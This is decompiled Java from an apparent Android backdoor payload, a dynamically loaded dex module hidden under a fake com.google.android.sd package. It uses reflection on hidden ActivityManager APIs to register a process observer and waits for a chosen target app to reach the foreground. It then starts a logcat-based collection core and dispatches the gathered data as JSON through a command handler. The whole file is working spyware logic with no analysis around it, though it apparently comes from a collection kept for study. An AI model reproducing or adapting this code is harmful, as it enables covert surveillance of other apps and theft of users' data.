package com.google.android.sd.biz_dynamic_dex.td.logcat.d;

import android.app.IProcessObserver;
import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.a.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public final class b extends IProcessObserver.Stub implements a.a {
  private Context a;
  
  private a b;
  
  private com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.b c;
  
  private String d;
  
  private int e;
  
  private Object f;
  
  public b(Context paramContext, String paramString) {
    try {
      this.a = paramContext;
      this.c = com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.b.a(paramString);
      return;
    } catch (Exception exception) {
      b("impl_init_fail");
      return;
    } 
  }
  
  private void b(String paramString) {
    a.a(this.a, paramString);
  }
  
  private boolean c() {
    Exception exception;
    try {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_reg_process_observer");
      Class<?> clazz1 = Class.forName("android.app.ActivityManagerNative");
      Class<?> clazz2 = Class.forName("android.app.IActivityManager");
      this.f = clazz1.getMethod("getDefault", new Class[0]).invoke(clazz1, new Object[0]);
      clazz2.getMethod("registerProcessObserver", new Class[] { Class.forName("android.app.IProcessObserver") }).invoke(this.f, new Object[] { this });
      a.b();
      return true;
    } catch (Exception null) {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_reg_process_observer_error_".concat(String.valueOf(exception)));
      a.b();
      return false;
    } finally {}
    a.b();
    throw exception;
  }
  
  private void d() {
    Exception exception;
    try {
      if (this.f != null) {
        com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_un_reg_process_observer");
        Class.forName("android.app.IActivityManager").getMethod("unregisterProcessObserver", new Class[] { Class.forName("android.app.IProcessObserver") }).invoke(this.f, new Object[] { this });
        this.f = null;
      } 
      a.b();
      return;
    } catch (Exception null) {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_un_reg_process_observer_error_".concat(String.valueOf(exception)));
      a.b();
      return;
    } finally {}
    a.b();
    throw exception;
  }
  
  public final void a(String paramString) {
    try {
      String str2;
      String str1;
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_report");
      paramString = a.c(paramString);
      CmdData cmdData2 = new CmdData(36799, paramString, "client");
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("uuid_".concat(String.valueOf(paramString)));
      JSONObject jSONObject1 = new JSONObject();
      jSONObject1.put("mode", 101);
      jSONObject1.put("version", this.d);
      a a1 = this.b;
      if (a1 != null) {
        str2 = a1.b();
      } else {
        str2 = "";
      } 
      boolean bool = TextUtils.isEmpty(str2);
      JSONObject jSONObject2 = new JSONObject();
      jSONObject2.put("config", jSONObject1);
      if (!bool)
        jSONObject2.put("data", str2); 
      CmdData cmdData1 = Utils.buildSucceedRespData(cmdData2, jSONObject2, null);
      CmdHandler.dispatch(this.a, cmdData1);
      Context context = this.a;
      if (bool) {
        str1 = "6";
      } else {
        str1 = "5";
      } 
      a.b(context, str1);
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_report_error_");
      stringBuilder.append(exception.getMessage());
      b(stringBuilder.toString());
      return;
    } 
  }
  
  public final boolean a() {
    try {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_start");
      Context context = this.a;
      if (context == null) {
        b("impl_invalid_context");
        return false;
      } 
      if (this.b != null) {
        b("impl_is_working");
        return false;
      } 
      com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.b b1 = this.c;
      if (b1 == null) {
        b("impl_data_is_null");
        return false;
      } 
      this.b = new a(context, b1);
      String str = this.c.b;
      if (TextUtils.isEmpty(str)) {
        b("impl_package_name_is_null");
        return false;
      } 
      if (!a.c(this.a, str)) {
        b("impl_app_has_uninstall");
        return false;
      } 
      this.d = a.e(this.a, str);
      int i = a.d(this.a, str);
      this.e = i;
      if (i == -1) {
        b("impl_package_uid_is_null");
        return false;
      } 
      return c();
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_start_error_");
      stringBuilder.append(exception.getMessage());
      b(stringBuilder.toString());
      return false;
    } 
  }
  
  public final void b() {
    try {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_stop");
      d();
      if (this.b != null) {
        com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_stop_core");
        this.b.d();
        this.b = null;
      } 
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_stop_error_");
      stringBuilder.append(exception.getMessage());
      b(stringBuilder.toString());
      return;
    } 
  }
  
  public final void onForegroundActivitiesChanged(int paramInt1, int paramInt2, boolean paramBoolean) {
    try {
      if (this.e == paramInt2) {
        com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_start_core");
        d();
        a a1 = this.b;
        if (a1 != null)
          a1.a(); 
      } 
      return;
    } catch (Exception exception) {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("impl_foreground_change_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
  
  public final void onForegroundServicesChanged(int paramInt1, int paramInt2, int paramInt3) {}
  
  public final void onProcessDied(int paramInt1, int paramInt2) {}
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8aeb045fad9343acbbd1a26998b6485a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\d\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */